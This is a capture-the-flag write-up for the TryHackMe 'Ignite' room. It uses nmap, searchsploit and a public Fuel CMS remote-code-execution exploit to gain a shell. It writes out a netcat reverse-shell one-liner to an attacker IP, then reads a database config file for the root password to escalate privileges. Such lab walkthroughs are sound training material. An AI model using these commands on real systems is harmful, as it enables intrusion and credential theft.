# Ignite

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Challenge
Difficulty: Easy
OS: Linux
Subscription type: Free
Description: A new start-up has a few issues with their web server.
```

Room link: [https://tryhackme.com/r/room/ignite](https://tryhackme.com/r/room/ignite)

## Solution

### Check for services with nmap

We start by scanning the machine with `nmap`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Ignite]
└─$ nmap -v -sV -sC -p- 10.10.21.21                       
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-24 19:50 CEST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:50
Completed NSE at 19:50, 0.00s elapsed
Initiating NSE at 19:50
Completed NSE at 19:50, 0.00s elapsed
Initiating NSE at 19:50
Completed NSE at 19:50, 0.00s elapsed
Initiating Ping Scan at 19:50
Scanning 10.10.21.21 [2 ports]
Completed Ping Scan at 19:50, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:50
Completed Parallel DNS resolution of 1 host. at 19:50, 0.00s elapsed
Initiating Connect Scan at 19:50
Scanning 10.10.21.21 [65535 ports]
Discovered open port 80/tcp on 10.10.21.21
Completed Connect Scan at 19:50, 13.88s elapsed (65535 total ports)
Initiating Service scan at 19:50
Scanning 1 service on 10.10.21.21
Completed Service scan at 19:50, 6.96s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.21.21.
Initiating NSE at 19:50
Completed NSE at 19:50, 1.47s elapsed
Initiating NSE at 19:50
Completed NSE at 19:50, 0.19s elapsed
Initiating NSE at 19:50
Completed NSE at 19:50, 0.01s elapsed
Nmap scan report for 10.10.21.21
Host is up (0.048s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-title: Welcome to FUEL CMS
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)

NSE: Script Post-scanning.
Initiating NSE at 19:50
Completed NSE at 19:50, 0.00s elapsed
Initiating NSE at 19:50
Completed NSE at 19:50, 0.00s elapsed
Initiating NSE at 19:50
Completed NSE at 19:50, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.19 seconds
```

We have one service running:

- Apache httpd v2.4.18 on port 80

Manually browsing to port 80 shows a `Welcome to Fuel CMS Version 1.4` page.

### Search for an exploit

Next, let's check if there are any known exploits

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Ignite]
└─$ searchsploit fuel cms            
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                     |  Path
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                                                                                         | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                                                                         | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                                                                         | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                                                                        | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                                                               | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                                                                   | php/webapps/48778.txt
Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)                                                                                 | php/webapps/50884.txt
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Ignite]
└─$ searchsploit -m 47138
  Exploit: fuel CMS 1.4.1 - Remote Code Execution (1)
      URL: https://www.exploit-db.com/exploits/47138
     Path: /usr/share/exploitdb/exploits/linux/webapps/47138.py
    Codes: CVE-2018-16763
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /mnt/hgfs/Wargames/TryHackMe/CTFs/Easy/Ignite/47138.py
```

### Modify and run the exploit

Now we modify the exploit:

- Change the url
- Disable the use of a proxy

and run it

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Ignite]
└─$ python 47138.py                                             
  File "/mnt/hgfs/Wargames/TryHackMe/CTFs/Easy/Ignite/47138.py", line 34
    print r.text[0:dup]
    ^^^^^^^^^^^^^^^^^^^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Ignite]
└─$ python2 47138.py
cmd:id
systemuid=33(www-data) gid=33(www-data) groups=33(www-data)

<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

<h4>A PHP Error was encountered</h4>
<---snip--->
```

We can run commands as the `www-data` user.

### Get a reverse shell

Why not get a nicer reverse shell?  
First, we start a netcat listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Ignite]
└─$ nc -lvnp 12345
listening on [any] 12345 ...

```

And then we start a reverse shell

```bash
cmd:rm /tmp/f; mkfifo /tmp/f; cat /tmp/f |/bin/sh -i 2>&1 |nc 10.14.61.233 12345 > /tmp/f
```

If we return to the netcat lister we see a connection

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Ignite]
└─$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [10.14.61.233] from (UNKNOWN) [10.10.21.21] 53058
/bin/sh: 0: can't access tty; job control turned off
$ $ /bin/sh: 2: asf: not found
$ pwd
/var/www/html
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html$ 
```

Nice!

### Get the user flag

Next, we can search for the user flag with `find`

```bash
www-data@ubuntu:/var/www/html$ find / -type f -name user.txt 2> /dev/null
find / -type f -name user.txt 2> /dev/null
www-data@ubuntu:/var/www/html$ find / -type f -name flag.txt 2> /dev/null
find / -type f -name flag.txt 2> /dev/null
/home/www-data/flag.txt
www-data@ubuntu:/var/www/html$ cat /home/www-data/flag.txt
cat /home/www-data/flag.txt
6<REDACTED>b 
www-data@ubuntu:/var/www/html$ 
```

### Enumeration

It's now time for enumeration and finding a way to escalate our privileges.  
Searching the Internet for information on `Fuel CMS` turns out two interesting things:

- The [default user and password](https://forum.getfuelcms.com/discussion/1522/default-user-name-and-password) for the database is `admin:admin`
- There is a [database configuration file](https://www.codeigniter.com/user_guide/database/configuration.html) located at `app/Config/Database.php`

We search for the `database.php` file and check its contents

```bash
 www-data@ubuntu:/var/www/html$ find / -type f -name [Dd]atabase.php 2> /dev/null
<ml$ find / -type f -name [Dd]atabase.php 2> /dev/null                       
/var/www/html/fuel/application/config/database.php
<ml$ cat /var/www/html/fuel/application/config/database.php                  
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
| -------------------------------------------------------------------

<---snip--->

*/
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
        @include(TESTER_PATH.'config/tester_database'.EXT);
}
www-data@ubuntu:/var/www/html$ 
```

We have a possible password `mememe` for root

### Privilege escalation

Let's try to `su` to `root`

```bash
www-data@ubuntu:/var/www/html$ su root
su root
Password: mememe

root@ubuntu:/var/www/html# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/var/www/html# 
```

Excellent, we are root.

### Get the root flag

Finally, we locate and cat the root flag

```bash
root@ubuntu:/var/www/html# cd /root
cd /root
root@ubuntu:~# ls -la
ls -la
total 32
drwx------  4 root root 4096 Jul 26  2019 .
drwxr-xr-x 24 root root 4096 Jul 26  2019 ..
-rw-------  1 root root  357 Jul 26  2019 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Feb 26  2019 .cache
drwxr-xr-x  2 root root 4096 Jul 26  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   34 Jul 26  2019 root.txt
root@ubuntu:~# cat root.txt
cat root.txt
b<REDACTED>d 
root@ubuntu:~# 
```

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [su - Linux manual page](https://man7.org/linux/man-pages/man1/su.1.html)
